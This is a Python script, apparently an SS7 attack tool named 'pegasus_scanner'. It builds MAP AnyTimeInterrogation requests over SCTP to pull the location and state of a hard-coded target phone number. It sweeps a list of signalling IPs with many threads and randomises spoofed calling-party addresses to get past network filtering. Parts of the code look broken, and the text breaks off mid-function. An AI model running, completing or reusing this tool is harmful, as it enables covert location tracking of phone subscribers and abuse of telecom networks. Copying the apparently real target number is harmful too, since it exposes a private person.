#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any, Dict as TypingDict
from contextlib import contextmanager
from copy import deepcopy

# --- Global Enums ---
class AtiVariant(Enum):
    STANDARD="Standard"
    NO_REQUESTED_INFO="NoReqInfo"
    NO_GSMSCF_ADDRESS="NoSCFAddr"
    LOCATION_ONLY="LocInfoOnly"
    STATE_ONLY="StateOnly"

# --- Library Imports with Error Handling ---
try:
    import sctp
except ImportError:
    print("CRITICAL Error: 'sctp' (python-sctp) library not found. Install it with 'pip install pysctp'.")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.text import Text
    from rich.panel import Panel
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
    from rich.logging import RichHandler
    console = Console()
except ImportError:
    print("CRITICAL Error: 'rich' library not found. Install with 'pip install rich'. Falling back to basic printing.")
    class DummyConsole:
        def print(self, *args, **kwargs): print(*args)
    console = DummyConsole()

try:
    import hexdump
except ImportError:
    hexdump = None 

# --- Pycrate Globals Initialization ---
PYCRATE_AVAILABLE = False
ASN1Obj = None 
SEQ, CHOICE, INT, NULL, OPEN_TYPE, OCT_STR, OID, EXTERNAL_pycrate = (None,) * 8
ASN1Dict_global, GLOBAL, ASN1RefType_cls_ref = (None,) * 3
MODE_TYPE, MODE_VALUE, MODE_SET = (None,) * 3
TAG_UNIVERSAL, TAG_APPLICATION, TAG_CONTEXT_SPEC, TAG_PRIVATE = (None,) * 4
TAG_IMPLICIT, TAG_EXPLICIT = None, None
ASN1CodecBER = None
PycrateASN1ObjErr, ASN1RTError_pycrate = None, None

TCAP_defs_pycrate = None 
MAP_defs_pycrate, SCCP_defs_pycrate = None, None
MAP_AC_defs_pycrate, MAP_IE_defs_pycrate = None, None
 
CHOICE_Class_imported_construct = None 

logger_init_pycrate_info = "pycrate: Initializing..."

pycrate_core_types_check_list = [
    (SEQ, "SEQ_Class"), (CHOICE, "CHOICE_global_alias"), (INT, "INT_Class"), (OID, "OID_Class_from_pycrate"), 
    (OPEN_TYPE, "OPEN_TYPE"), (ASN1Dict_global, "ASN1Dict_global"),
    (None, "MODE_TYPE_val_present_placeholder"), 
    (NULL, "NULL_Class"), 
    (None, "TAG_CONTEXT_SPEC_from_utils_present_placeholder"), 
    (None, "TAG_IMPLICIT_from_utils_present_placeholder"), 
    (ASN1RefType_cls_ref, "ASN1RefType_cls_ref"),
    (None, "ASN1CodecBER_class_present_placeholder"), 
    (ASN1Obj, "ASN1Obj_base_class"),
    (CHOICE_Class_imported_construct, "CHOICE_Class_imported_construct") 
]
pycrate_core_types_loaded_check = False

try:
    from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr as PycrateASN1ObjErr_local
    ASN1RTError_pycrate = ASN1Err
    PycrateASN1ObjErr = PycrateASN1ObjErr_local
    from pycrate_asn1rt.asnobj_ext import EXT as EXT_Class, OPEN
    EXTERNAL_pycrate = EXT_Class; OPEN_TYPE = OPEN
    from pycrate_asn1rt.asnobj_basic import OID as OID_Class, INT as INT_Class, NULL as NULL_Class, ASN1Obj as ASN1Obj_imported
    OID = OID_Class; INT = INT_Class; NULL = NULL_Class; ASN1Obj = ASN1Obj_imported 
    from pycrate_asn1rt.asnobj_str import OCT_STR as OCT_STR_Class
    OCT_STR = OCT_STR_Class
    from pycrate_asn1rt.asnobj_construct import SEQ as SEQ_Class, CHOICE as CHOICE_Base_Class 
    SEQ = SEQ_Class; CHOICE = CHOICE_Base_Class; CHOICE_Class_imported_construct = CHOICE_Base_Class
    from pycrate_asn1rt.dictobj import ASN1Dict
    ASN1Dict_global = ASN1Dict
    from pycrate_asn1rt.glob import GLOBAL as GLOBAL_obj
    GLOBAL = GLOBAL_obj
    from pycrate_asn1rt.utils import (
        MODE_TYPE as MODE_TYPE_val, MODE_VALUE as MODE_VALUE_val, MODE_SET as MODE_SET_val,
        TAG_UNIVERSAL as TAG_UNIVERSAL_from_utils, TAG_APPLICATION as TAG_APPLICATION_from_utils,
        TAG_CONTEXT_SPEC as TAG_CONTEXT_SPEC_from_utils, TAG_PRIVATE as TAG_PRIVATE_from_utils,
        TAG_IMPLICIT as TAG_IMPLICIT_from_utils, TAG_EXPLICIT as TAG_EXPLICIT_from_utils
    )
    MODE_TYPE, MODE_VALUE, MODE_SET = MODE_TYPE_val, MODE_VALUE_val, MODE_SET_val
    TAG_UNIVERSAL, TAG_APPLICATION, TAG_CONTEXT_SPEC, TAG_PRIVATE = (
        TAG_UNIVERSAL_from_utils, TAG_APPLICATION_from_utils, 
        TAG_CONTEXT_SPEC_from_utils, TAG_PRIVATE_from_utils
    )
    TAG_IMPLICIT, TAG_EXPLICIT = TAG_IMPLICIT_from_utils, TAG_EXPLICIT_from_utils
    from pycrate_asn1rt.refobj import ASN1RefType as ASN1RefType_cls_imported
    ASN1RefType_cls_ref = ASN1RefType_cls_imported
    from pycrate_asn1rt.codecs import ASN1CodecBER 

    pycrate_core_types_check_list = [
        (SEQ, "SEQ_Class"), (CHOICE, "CHOICE_global_alias"), (INT, "INT_Class"), (OID, "OID_Class_from_pycrate"), 
        (OPEN_TYPE, "OPEN_TYPE"), (ASN1Dict_global, "ASN1Dict_global"),
        (MODE_TYPE is not None, "MODE_TYPE_val_present"), 
        (NULL, "NULL_Class"), 
        (TAG_CONTEXT_SPEC is not None, "TAG_CONTEXT_SPEC_from_utils_present"), 
        (TAG_IMPLICIT is not None, "TAG_IMPLICIT_from_utils_present"), 
        (ASN1RefType_cls_ref, "ASN1RefType_cls_ref"),
        (ASN1CodecBER is not None, "ASN1CodecBER_class_present"),
        (ASN1Obj, "ASN1Obj_base_class"),
        (CHOICE_Class_imported_construct, "CHOICE_Class_imported_construct") 
    ]
    pycrate_core_types_loaded_check = all(item[0] is not None if not isinstance(item[0], bool) else item[0] for item in pycrate_core_types_check_list)

    if not pycrate_core_types_loaded_check:
        PYCRATE_AVAILABLE = False
        missing_items_str = ", ".join([name for item_val, name in pycrate_core_types_check_list if not (item[0] if isinstance(item[0], bool) else item[0] is not None)])
        logger_init_pycrate_info += f" | CRITICAL: Pycrate core types check failed post-import. Missing: {missing_items_str}."
    else:
        PYCRATE_AVAILABLE = True
        logger_init_pycrate_info += " | Core pycrate_asn1rt libraries loaded."

    if PYCRATE_AVAILABLE:
        from pycrate_mobile import SCCP as SCCP_module
        SCCP_defs_pycrate = SCCP_module
        from pycrate_mobile import TS29002_MAPIE as MAP_IE_module
        MAP_IE_defs_pycrate = MAP_IE_module
        from pycrate_mobile import TS29002_MAPAppCtx as MAP_AC_module
        MAP_AC_defs_pycrate = MAP_AC_module
        
        MAP_defs_pycrate = None
        try:
            from pycrate_mobile import MAP as MAP_module_for_datatypes
            MAP_defs_pycrate = MAP_module_for_datatypes
            logger_init_pycrate_info += " | MAP Data Types from pycrate_mobile.MAP."
        except ImportError:
            logger_init_pycrate_info += " | pycrate_mobile.MAP not found, trying TCAP_MAPv2v3 for MAP Data Types."
            try:
                from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_module_fallback # Standard pycrate location
                if hasattr(MAP_module_fallback, 'MAP_MS_DataTypes') or hasattr(MAP_module_fallback, 'AnyTimeInterrogationArg'):
                     MAP_defs_pycrate = MAP_module_fallback
                     logger_init_pycrate_info += " | MAP Data Types successfully sourced from TCAP_MAPv2v3."
                else:
                     logger_init_pycrate_info += " | WARNING: TCAP_MAPv2v3 imported but lacks MAP_MS_DataTypes/AnyTimeInterrogationArg."
            except ImportError:
                logger_init_pycrate_info += " | WARNING: TCAP_MAPv2v3 fallback for MAP also failed to import."
        
        if MAP_defs_pycrate is None: PYCRATE_AVAILABLE = False; print("CRITICAL: MAP defs missing.")

        if PYCRATE_AVAILABLE:
            try:
                from pycrate_asn1dir import TCAP2 # <<< تم تعديل هذا السطر
                TCAP_defs_pycrate = TCAP2.TCAPMessages
                logger_init_pycrate_info += f" | Successfully loaded TCAP_defs_pycrate from pycrate_asn1dir.TCAP2 (type: {type(TCAP_defs_pycrate)})."
                if not all(hasattr(TCAP_defs_pycrate, t_name) for t_name in ['Invoke', 'Component', 'Begin', 'TCMessage']):
                    raise ImportError("User TCAP definitions (TCAP2.py) missing some essential types.")
            except (ImportError, ModuleNotFoundError) as e_user_tcap:
                print(f"CRITICAL Error: Could not import TCAP2 from pycrate_asn1dir: {e_user_tcap}")
                TCAP_defs_pycrate = None; PYCRATE_AVAILABLE = False 
            except AttributeError as e_attr: 
                print(f"CRITICAL Error: TCAP2 module imported, but TCAPMessages class not found, or TCAP2 is not as expected: {e_attr}")
                TCAP_defs_pycrate = None; PYCRATE_AVAILABLE = False
            except Exception as e_user_tcap_struct:
                print(f"CRITICAL Error: Problem with user TCAP definitions (TCAP2.py): {e_user_tcap_struct}")
                TCAP_defs_pycrate = None; PYCRATE_AVAILABLE = False
    
    if PYCRATE_AVAILABLE and (TCAP_defs_pycrate is None or MAP_defs_pycrate is None):
         PYCRATE_AVAILABLE = False
         logger_init_pycrate_info += " | CRITICAL: Post-load check, TCAP or MAP definitions are None."
    
    if PYCRATE_AVAILABLE: logger_init_pycrate_info += " | All definitions appear loaded."
    else: 
        if "CRITICAL" not in logger_init_pycrate_info: logger_init_pycrate_info += " | CRITICAL: Load failure."

except ImportError as e: PYCRATE_AVAILABLE=False; logger_init_pycrate_info = f"Pycrate core import error: {e}"
except Exception as e: PYCRATE_AVAILABLE=False; logger_init_pycrate_info = f"Pycrate general init error: {e}"; traceback.print_exc()

# --- Construct library imports (Optional) ---
ConstructOptional, ConstructSequence, BERLengthDecoder_construct = None, None, None
Struct, Const, Bytes, GreedyBytes, Int8ub, Int16ub = (None,) * 6
Prefixed, If, Switch, Computed, len_, Tell, Pointer = (None,) * 7
FocusedSeq, Select, Adapter, Check, Pass, GreedyRange = (None,) * 6
Byte, this, Probe, RepeatUntil, Terminated, BytesInteger, IfThenElse = (None,) * 7
FixedSized, Default, Peek = None, None, None
logger_init_construct_info = "construct: Library not imported or initialization skipped."

try:
    from construct import (
        Struct as Struct_c, Const as Const_c, Bytes as Bytes_c, GreedyBytes as GreedyBytes_c, Int8ub as Int8ub_c, Int16ub as Int16ub_c,
        Sequence as ConstructSequence_c, Prefixed as Prefixed_c, If as If_c, Switch as Switch_c, Computed as Computed_c, len_ as len_c, Tell as Tell_c, Pointer as Pointer_c,
        Optional as ConstructOptional_c, FocusedSeq as FocusedSeq_c, Select as Select_c, Adapter as Adapter_c, Check as Check_c, Pass as Pass_c, GreedyRange as GreedyRange_c,
        Byte as Byte_c, this as this_c, Probe as Probe_c, RepeatUntil as RepeatUntil_c, Terminated as Terminated_c, BytesInteger as BytesInteger_c, IfThenElse as IfThenElse_c,
        FixedSized as FixedSized_c, Default as Default_c, Peek as Peek_c
    )
    Struct, Const, Bytes, GreedyBytes, Int8ub, Int16ub = Struct_c, Const_c, Bytes_c, GreedyBytes_c, Int8ub_c, Int16ub_c
    ConstructSequence, Prefixed, If, Switch, Computed, len_, Tell, Pointer = ConstructSequence_c, Prefixed_c, If_c, Switch_c, Computed_c, len_c, Tell_c, Pointer_c
    ConstructOptional, FocusedSeq, Select, Adapter, Check, Pass, GreedyRange = ConstructOptional_c, FocusedSeq_c, Select_c, Adapter_c, Check_c, Pass_c, GreedyRange_c
    Byte, this, Probe, RepeatUntil, Terminated, BytesInteger, IfThenElse = Byte_c, this_c, Probe_c, RepeatUntil_c, Terminated_c, BytesInteger_c, IfThenElse_c
    FixedSized, Default, Peek = FixedSized_c, Default_c, Peek_c
    try:
        from construct import BERLengthDecoder as ConstructBERLengthDecoder_imp
        BERLengthDecoder_construct = ConstructBERLengthDecoder_imp
        logger_init_construct_info = "construct: Using built-in BERLengthDecoder."
    except ImportError:
        logger_init_construct_info = "construct: BERLengthDecoder not found, manual BER length logic for response parsing."
except ImportError:
    print("WARNING: 'construct' library not found. Parts of response parsing might fail. Install with 'pip install construct'.")
    ConstructOptional = lambda name, subcon: subcon 
    logger_init_construct_info = "construct: Library not found. Parts of response parsing might fail."

logger = logging.getLogger("pegasus_scanner") 

ManualBerLengthField = None
CustomBerTlv = None
CustomImplicitlyTagged = None
CustomExplicitlyTagged = None
TbcdAdapter = None

def get_ber_length_decoder(): 
    return BERLengthDecoder_construct if BERLengthDecoder_construct else ManualBerLengthField

def initialize_construct_based_definitions(): 
    global ManualBerLengthField, CustomBerTlv, CustomImplicitlyTagged, CustomExplicitlyTagged, TbcdAdapter
    global ConstructOptional, Peek, Byte, IfThenElse, Struct, Computed, Check, Bytes, this, Adapter, Const, FixedSized, len_

    if all(c is not None for c in [ConstructOptional, Peek, Byte, IfThenElse, Struct, Computed, Check, Bytes, this]):
        try: 
            ManualBerLengthField = FocusedSeq("actual_length", Peek(Byte),"_length_first_byte" / Peek(Byte),IfThenElse(this._length_first_byte < 0x80,Struct("_length_byte_val" / Byte, "actual_length" / Computed(this._length_byte_val)),Struct("_len_indicator_byte" / Byte, "num_octets" / Computed(lambda ctx: ctx._len_indicator_byte & 0x7F),Check(lambda ctx: 0 <= ctx.num_octets <= 4),"length_octets" / Bytes(this.num_octets),"actual_length" / Computed(lambda ctx: int.from_bytes(ctx.length_octets, 'big')))))
            if logger: logger.info("ManualBerLengthField (construct-based) defined.")
        except Exception as e_mblf:
            if logger: logger.error(f"Error defining ManualBerLengthField: {e_mblf}")
            ManualBerLengthField = None
    else:
        if logger: logger.warning("One or more base Construct components for ManualBerLengthField are missing.")
        ManualBerLengthField = None

    ber_decoder_instance = get_ber_length_decoder() 
    if all(c is not None for c in [Struct, Const, FixedSized, this]) and ber_decoder_instance: 
        try:
            CustomBerTlv = lambda tag_byte_val, subcon: Struct("tag" / Const(bytes([tag_byte_val])),"length" / ber_decoder_instance,"value" / FixedSized(this.length, subcon))
            CustomImplicitlyTagged = lambda ctx_tag, subcon, is_constructed=False: CustomBerTlv( (0x80 | ctx_tag) | (0x20 if is_constructed else 0), subcon)
            CustomExplicitlyTagged = lambda ctx_tag, subcon_tlv_def: CustomBerTlv(0xA0 | ctx_tag, subcon_tlv_def)
            if logger: logger.info("CustomBerTlv, CustomImplicitlyTagged, CustomExplicitlyTagged (construct-based) defined.")
        except Exception as e_cbt:
            if logger: logger.error(f"Error defining CustomBerTlv etc.: {e_cbt}")
            CustomBerTlv, CustomImplicitlyTagged, CustomExplicitlyTagged = None, None, None
    else:
        if logger: logger.warning("One or more base Construct components for CustomBerTlv (or get_ber_length_decoder result) are missing.")
        CustomBerTlv, CustomImplicitlyTagged, CustomExplicitlyTagged = None, None, None
    
    if Adapter: 
        try:
            class LocalTbcdAdapter(Adapter): 
                def _decode(self,obj: bytes, ctx: Any, pth: Any) -> str: return "".join([f"{(b&0xF):X}{((b>>4)&0xF):X}" for b in obj]).replace("F","")
                def _encode(self,obj: Any, ctx: Any, pth: Any) -> bytes:
                    s=str(obj).upper(); sd = "".join(c for c in s if c in "0123456789ABCDEF"); sp = sd + 'F' if len(sd) % 2 else sd
                    if not sp and len(sd) == 0 and len(s) > 0: return b'' 
                    if not sp: return b''; return bytes.fromhex("".join(sp[i:i+2][::-1] for i in range(0,len(sp),2)))
            TbcdAdapter = LocalTbcdAdapter 
            if logger: logger.info("TbcdAdapter (construct-based) defined.")
        except Exception as e_tbcd:
            if logger: logger.error(f"Error defining TbcdAdapter: {e_tbcd}")
            TbcdAdapter = None
    else: 
        TbcdAdapter = None
        if PYCRATE_AVAILABLE and logger : logger.warning("construct.Adapter not available, TbcdAdapter cannot be defined (though pycrate is up).")
        elif logger: logger.warning("construct.Adapter not available, TbcdAdapter cannot be defined.")

initialize_construct_based_definitions() 

# --- Global Constants ---
MAP_OP_ANY_TIME_INTERROGATION = 71 
TCAP_TAG_DTID = 0x48 
TCAP_TAG_COMPONENT_PORTION = 0x6C 
TCAP_MSG_U_ABORT_TAG = 0x69 
TCAP_MSG_P_ABORT_TAG = 0x6A 
TCAP_MSG_END_TAG = 0x65 
TCAP_MSG_CONTINUE_TAG = 0x64 
TCAP_COMP_RETURN_RESULT_LAST_TAG = 0xA2 
TCAP_COMP_RETURN_ERROR_TAG = 0xA3 
TCAP_COMP_REJECT_TAG = 0xA4 

Manual_Invoke_Template = None 

# ... (Rest of the script: build_ber_length, find_tlv, MAP_ERROR_CODES, etc.)
def build_ber_length(length_int: int) -> bytes:
    if not isinstance(length_int, int): raise ValueError("int expected")
    if length_int < 0: raise ValueError("non-negative int expected")
    if length_int < 0x80: return bytes([length_int])
    lb = bytearray(); tl = length_int
    while tl > 0: lb.insert(0, tl & 0xFF); tl >>= 8
    if not lb and length_int == 0: lb.append(0) 
    elif not lb : lb.append(0) 
    if len(lb) > 126: raise ValueError(f"Length {length_int} too large for BER")
    return bytes([0x80 | len(lb)]) + lb

def find_tlv(data_bytes:bytes,target_tag:int,is_constructed:bool=False)->Tuple[Optional[bytes],Optional[int],Optional[bytes]]:
    idx=0
    while idx<len(data_bytes):
        if idx >= len(data_bytes): return None,None,None
        tag=data_bytes[idx];tag_start=idx;idx+=1
        if idx>=len(data_bytes):
            if logger: logger.debug(f"find_tlv (manual): Ran out of data for length byte after tag {tag:02X} at offset {tag_start}")
            return None,None,None
        try:
            len_byte=data_bytes[idx]; idx+=1
            if not (len_byte&0x80):val_len=len_byte;val_start=idx
            else:
                num_octs=len_byte&0x7F
                if num_octs==0 or num_octs>4: 
                    if logger: logger.debug(f"find_tlv (manual): Invalid num_octets_for_len {num_octs} for tag {tag:02X}")
                    return None,None,None 
                if idx+num_octs>len(data_bytes):
                    if logger: logger.debug(f"find_tlv (manual): Not enough data for long form length bytes for tag {tag:02X}")
                    return None,None,None
                val_len=int.from_bytes(data_bytes[idx:idx+num_octs],'big');val_start=idx+num_octs
                idx += num_octs 
        except IndexError: 
            if logger: logger.debug(f"find_tlv (manual): IndexError parsing length for tag {tag:02X}")
            return None,None,None
        except Exception as e_len_parse:
            if logger: logger.debug(f"find_tlv (manual): Exception parsing length for tag {tag:02X}: {e_len_parse}")
            return None,None,None
        
        if val_start+val_len>len(data_bytes):
            if logger: logger.debug(f"find_tlv (manual): Declared value length {val_len} for tag {tag:02X} exceeds available data {len(data_bytes)-val_start}")
            return None,None,None
        
        val_bytes_extracted=data_bytes[val_start:val_start+val_len]
        full_tlv_extracted=data_bytes[tag_start:val_start+val_len]
        
        if tag==target_tag: 
            if logger: logger.debug(f"find_tlv (manual): Found target tag {target_tag:02X}, value_len {val_len}")
            return val_bytes_extracted,tag,full_tlv_extracted
        idx=val_start+val_len
        
    if logger: logger.debug(f"find_tlv (manual): Target tag {target_tag:02X} not found in data of len {len(data_bytes)}")
    return None,None,None

MAP_ERROR_CODES = {1:"Unknown subscriber",4:"System failure",5:"Unexpected data value",21:"Data missing",26:"Facility not supported",27:"Absent subscriber"}
def interpret_map_error_code(error_code_bytes: bytes) -> str:
    if not error_code_bytes: return "MAP Error (No specific code)"
    try: err_code = int.from_bytes(error_code_bytes,'big'); return f"MAP Error {err_code} - {MAP_ERROR_CODES.get(err_code,'Undefined')}"
    except ValueError: return f"MAP Error (Malformed: {binascii.hexlify(error_code_bytes).decode()})"

DEFAULT_TARGET_MSISDN="212681364829";DEFAULT_IPS_FILE="ips.txt";DEFAULT_RESULTS_DIR="results_pycrate_only_v_final_fixed";DEFAULT_MAX_WORKERS=30;DEFAULT_SCTP_TIMEOUT=5;DEFAULT_SCTP_PPID=0;DEFAULT_CDPA_SSN=6;DEFAULT_CDPA_TT=0;DEFAULT_CDPA_NP=1;DEFAULT_CDPA_ES=18;DEFAULT_CDPA_NAI=4;DEFAULT_CGPA_SSN_POOL=[8];DEFAULT_CGPA_GT_DIGITS="212661000001";DEFAULT_CGPA_TT=0;DEFAULT_CGPA_NP=1;DEFAULT_CGPA_ES=18;DEFAULT_CGPA_NAI=4;DEFAULT_SCCP_PROTO_CLASS_POOL = [0x00]
DEFAULT_SCTP_PORTS_INTERNAL = [2905,2906]
main_csv_lock=threading.Lock();per_ip_file_locks:TypingDict[str,threading.Lock]={};per_ip_file_locks_lock=threading.Lock();suspicious_log_lock=threading.Lock()
pdu_build_lock = threading.Lock()

ISDN_AddressString_Inner_Manual,IMSI_Type_Inner_Manual,CellGlobalId_Construct_Manual,SubscriberState_Construct_Manual,LocationInformation_Construct_Manual,SubscriberInfo_Construct_Manual,AnyTimeInterrogationRes_Construct_Manual=(None,)*7
Int8ub_ref = globals().get('Int8ub')
Int16ub_ref = globals().get('Int16ub')

construct_prereqs_for_manual_parsers = [
    ConstructSequence, ConstructOptional, CustomImplicitlyTagged, TbcdAdapter, GreedyBytes,
    Byte, Int8ub_ref, Bytes, Struct, Default, FixedSized, this, get_ber_length_decoder, Int16ub_ref
]
if all(c is not None for c in construct_prereqs_for_manual_parsers):
    try:
        ISDN_AddressString_Inner_Manual=Struct("nai"/Byte,"digits"/TbcdAdapter(GreedyBytes))
        IMSI_Type_Inner_Manual=TbcdAdapter(GreedyBytes)
        CgiData8Byte_Construct_Manual=Struct("plmn_raw"/Bytes(3),"lac_raw"/Bytes(2),"ci_raw"/Bytes(2),"extra_byte"/Default(Byte,0))
        CellGlobalId_Construct_Manual=CustomImplicitlyTagged(5,CgiData8Byte_Construct_Manual,is_constructed=True)
        SubscriberStateChoiceValue_Construct_Manual=Struct("tag"/Byte,"length"/get_ber_length_decoder(),"val"/FixedSized(this.length,GreedyBytes))
        SubscriberState_Construct_Manual=CustomImplicitlyTagged(2,SubscriberStateChoiceValue_Construct_Manual,is_constructed=True)
        LocationInformation_Construct_Manual=Struct("ageOfLocation"/ConstructOptional(CustomImplicitlyTagged(0,Int8ub_ref)),"cellGlobalId"/ConstructOptional(CellGlobalId_Construct_Manual),"mscName"/ConstructOptional(CustomImplicitlyTagged(6,ISDN_AddressString_Inner_Manual,is_constructed=True)),"vlrName"/ConstructOptional(CustomImplicitlyTagged(14,ISDN_AddressString_Inner_Manual,is_constructed=True)),"selectedPLMNId"/ConstructOptional(CustomImplicitlyTagged(16,Bytes(3))),GreedyBytes)
        SubscriberInfo_Construct_Manual=Struct("imsi"/ConstructOptional(CustomImplicitlyTagged(0,IMSI_Type_Inner_Manual)),"msisdn"/ConstructOptional(CustomImplicitlyTagged(2,ISDN_AddressString_Inner_Manual,is_constructed=True)),"networkAccessMode"/ConstructOptional(CustomImplicitlyTagged(3,Byte)),GreedyBytes)
        AnyTimeInterrogationRes_Construct_Manual=Struct("subscriberInfo"/ConstructOptional(CustomImplicitlyTagged(1,SubscriberInfo_Construct_Manual,is_constructed=True)),"subscriberState"/ConstructOptional(SubscriberState_Construct_Manual),"locationInformation"/ConstructOptional(CustomImplicitlyTagged(4,LocationInformation_Construct_Manual,is_constructed=True)),GreedyBytes)
    except Exception as e_construct_defs:
        if logger: logger.error(f"Error defining Construct-based response parsers: {e_construct_defs}")
        AnyTimeInterrogationRes_Construct_Manual = None 
else:
    if logger: logger.warning("One or more base Construct components for manual parsers are missing. Manual response parsing structures will not be defined.")
    AnyTimeInterrogationRes_Construct_Manual = None


def generate_dynamic_cgpa_gt(base:str,seed:str,min_l:int=11,max_l:int=14,digits_only:bool=False)->str:
    try:
        bd="".join(filter(str.isdigit,str(base)))
        iph=hashlib.md5(seed.encode()).hexdigest()[:random.randint(2,5)]
        p=bd+("".join(str(int(c,16)%10) for c in iph) if digits_only else iph.lower())
        dtl=random.randint(min_l,max_l)
        fg=p[:dtl] if len(p)>=dtl else p+"".join(random.choice("0123456789" if digits_only else "0123456789abcdef") for _ in range(dtl-len(p)))
        return fg
    except Exception: 
        return "".join(random.choice("0123456789") for _ in range(random.randint(min_l,max_l)))

def format_msisdn_for_map_manual(msisdn: str, nai_byte_value: int =0x91) -> bytes:
    def to_bcd(s_val, flip_nibbles_in_byte=False):
        s = "".join(filter(str.isdigit, str(s_val)))
        if len(s) % 2: s += "F"
        arr = bytearray()
        for i in range(0, len(s), 2):
            byte_str = s[i:i+2]
            if flip_nibbles_in_byte: arr.append(int(byte_str[1] + byte_str[0], 16))
            else: arr.append(int(byte_str, 16))
        return bytes(arr)
    return bytes([nai_byte_value]) + to_bcd(msisdn, flip_nibbles_in_byte=True)

def get_map_ati_args_dict(msisdn_str:str,scf_addr_str:Optional[str],ati_variant:AtiVariant,args:argparse.Namespace,unique_id_for_log:str) -> Optional[dict]:
    logger.info(f"[{unique_id_for_log}] Preparing ATI arguments dictionary for MSISDN: {msisdn_str}")
    try:
        ati_args_dict_val={}
        nai_val=(0x80|args.cdpa_nai) if args.cdpa_nai<=15 else args.cdpa_nai
        msisdn_bytes=format_msisdn_for_map_manual(msisdn_str,nai_byte_value=nai_val)
        if not msisdn_bytes: logger.error(f"[{unique_id_for_log}] Failed to format MSISDN {msisdn_str}"); return None
        ati_args_dict_val['subscriberIdentity']=('msisdn',msisdn_bytes)
        if ati_variant!=AtiVariant.NO_REQUESTED_INFO:
            req_info_dict={}
            if ati_variant==AtiVariant.STANDARD or ati_variant==AtiVariant.LOCATION_ONLY: req_info_dict['locationInformation']=0
            if ati_variant==AtiVariant.STANDARD or ati_variant==AtiVariant.STATE_ONLY: req_info_dict['subscriberState']=0
            ati_args_dict_val['requestedInfo']=req_info_dict
        if ati_variant!=AtiVariant.NO_GSMSCF_ADDRESS and scf_addr_str:
            nai_scf_val=(0x80|args.cgpa_nai) if args.cgpa_nai<=15 else args.cgpa_nai
            scf_bytes=format_msisdn_for_map_manual(scf_addr_str,nai_byte_value=nai_scf_val)
            if scf_bytes: ati_args_dict_val['gsmSCF-Address']=scf_bytes
        return ati_args_dict_val
    except Exception as e: logger.error(f"[{unique_id_for_log}] Error in get_map_ati_args_dict: {e}",exc_info=True); return None

def parse_mcc_mnc(plmn_raw_bytes: bytes) -> Tuple[str, str]:
    if len(plmn_raw_bytes) == 3:
        try:
            d1 = (plmn_raw_bytes[0] & 0xF0) >> 4; d2 = (plmn_raw_bytes[0] & 0x0F)
            d3 = (plmn_raw_bytes[1] & 0xF0) >> 4; mcc = str(d2) + str(d1) + str(d3)
            d4 = (plmn_raw_bytes[1] & 0x0F); d5 = (plmn_raw_bytes[2] & 0xF0) >> 4
            d6 = (plmn_raw_bytes[2] & 0x0F)
            mnc = str(d5) + str(d4) if d6 == 0xF else str(d5) + str(d4) + str(d6)
            return mcc, mnc
        except Exception as e: 
            if logger: logger.debug(f"Error parsing MCC/MNC: {e}"); return "N/A", "N/A"
    return "N/A", "N/A"

def interpret_sub_state(sub_state_data: Any) -> str:
    if hasattr(sub_state_data, 'val') and hasattr(sub_state_data, 'tag'):
        return f"RawState(Tag:0x{sub_state_data.tag:02X}, Val:{binascii.hexlify(sub_state_data.val).decode()})"
    elif isinstance(sub_state_data, tuple) and len(sub_state_data) == 2: 
        return f"StateChoice(Type:'{sub_state_data[0]}', Val:{sub_state_data[1]})"
    elif isinstance(sub_state_data, str): return sub_state_data
    elif isinstance(sub_state_data, int): return f"StateCode({sub_state_data})"
    return f"StateNotParsed({type(sub_state_data)})"

def get_per_ip_file_lock(lock_key: str) -> threading.Lock:
    global per_ip_file_locks, per_ip_file_locks_lock 
    with per_ip_file_locks_lock:
        if lock_key not in per_ip_file_locks: per_ip_file_locks[lock_key] = threading.Lock()
        return per_ip_file_locks[lock_key]


# --- build_full_pdu_with_pycrate definition (REWRITTEN to use TCAP_defs_pycrate) ---
def build_full_pdu_with_pycrate(final_otid_bytes: bytes, current_ati_variant: AtiVariant, args: argparse.Namespace, unique_id_for_log: str) -> Optional[bytes]:
    with pdu_build_lock:
        logger.debug(f"[{unique_id_for_log}] ENTERING PDU BUILD LOCK (using direct definitions).")

        if not PYCRATE_AVAILABLE or not pycrate_core_types_loaded_check:
            logger.error(f"[{unique_id_for_log}] Pycrate core components not fully available for PDU build.")
            return None
        
        crit_defs = {
            "TCAP_defs_pycrate": TCAP_defs_pycrate, "MAP_defs_pycrate": MAP_defs_pycrate, 
            "SCCP_defs_pycrate": SCCP_defs_pycrate, "MAP_AC_defs_pycrate": MAP_AC_defs_pycrate,
            "ASN1Obj": ASN1Obj, "CHOICE_Class_imported_construct": CHOICE_Class_imported_construct,
            "SEQ_Class": SEQ_Class, "OCT_STR": OCT_STR, "INT_Class": INT_Class,
            "OID": OID, "EXTERNAL_pycrate": EXTERNAL_pycrate, "NULL": NULL
        }
        for name, definition in crit_defs.items():
            if definition is None:
                logger.critical(f"[{unique_id_for_log}] Critical pycrate definition/type '{name}' is None for PDU build. Aborting.")
                return None
        
        try:
            # 1. Prepare MAP AnyTimeInterrogationArg
            ati_args_python_dict = get_map_ati_args_dict(args.target_msisdn, args.cgpa_gt_digits, current_ati_variant, args, unique_id_for_log)
            if ati_args_python_dict is None: 
                logger.error(f"[{unique_id_for_log}] Failed to get MAP ATI arguments dict.")
                return None

            MAP_MS_DataTypes_obj = getattr(MAP_defs_pycrate, 'MAP_MS_DataTypes', MAP_defs_pycrate)
            AnyTimeInterrogationArgType = getattr(MAP_MS_DataTypes_obj, 'AnyTimeInterrogationArg', None)
            if AnyTimeInterrogationArgType is None: 
                logger.error(f"[{unique_id_for_log}] MAP AnyTimeInterrogationArgType definition missing."); return None
            
            # This instance will be used if Invoke.parameter expects (Type, ValueDict)
            # ati_param_instance_for_tuple = deepcopy(AnyTimeInterrogationArgType)
            # ati_param_instance_for_tuple.set_val(ati_args_python_dict)

            # This instance will be used to get BER bytes if Invoke.parameter expects raw bytes
            ati_param_instance_for_ber = deepcopy(AnyTimeInterrogationArgType)
            ati_param_instance_for_ber.set_val(ati_args_python_dict)
            parameter_ber_bytes = ati_param_instance_for_ber.to_ber()


